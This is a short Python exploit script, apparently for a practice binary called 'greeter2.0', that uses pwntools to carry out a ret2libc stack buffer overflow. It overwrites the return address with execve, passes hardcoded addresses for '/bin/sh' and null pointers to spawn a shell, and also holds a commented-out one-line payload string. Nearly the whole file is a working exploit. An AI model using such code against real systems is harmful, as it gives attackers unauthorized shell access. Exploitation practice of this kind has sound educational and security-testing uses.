#!/usr/bin/env python3

# This is how the payload will look on the stack
# |                |
# | 'A' * offset2  |
# | NULL_PTR_ADDR  |
# | NULL_PTR_ADDR  |
# | BINSH_STR_ADDR |
# | EXECVE_ADDR    |
# | 'A' * offset1  |
# |                |
# ------------------

# r < <(python -c "print 'A'*216 + '\xe0\x27\xeb\xf7' + 'B'*4 + '\x0b\xda\xf5\xf7' + '\x07\x80\x04\x08' + 'C'*200 ")

from pwn import *

# Constants
OFFSET2 = 300  # just make it big, scanf will read 255 anyway

# Constants found by manual enumeration
OFFSET1 = 168 # cyclic + dmesg | tail -2 + cyclic --offset
EXECVE_ADDR = 0xf7eb27e0  # gdb greeter2.0 + p execve
BINSH_STR_ADDR = 0xf7f5da0b  # gdb greeter2.0 + find "/bin/sh"
NULL_PTR_ADDR = 0x8048007  # gdb greeter2.0 + find 0x00000000



p = process('./greeter2.0')

# fill begining of the buffer with some junk
payload = b'A' * OFFSET1

# this will override $eip
payload += p32(EXECVE_ADDR)

# we need some extra junk for return address of execve function
payload += b'A' * 4

# bin/bash string address - first argument for execve
payload += p32(BINSH_STR_ADDR)

# address pointing to null - second and third argument for execve
payload += p32(NULL_PTR_ADDR)
payload += p32(NULL_PTR_ADDR)

# fill end of the buffer with some junk
payload += b'A' * OFFSET2


### This could be used for debugging
# Attach to process
# gdb.attach(p)
# Wait for breakpoints, commands etc.
# raw_input("Send payload?")

p.sendline(payload)

p.interactive()




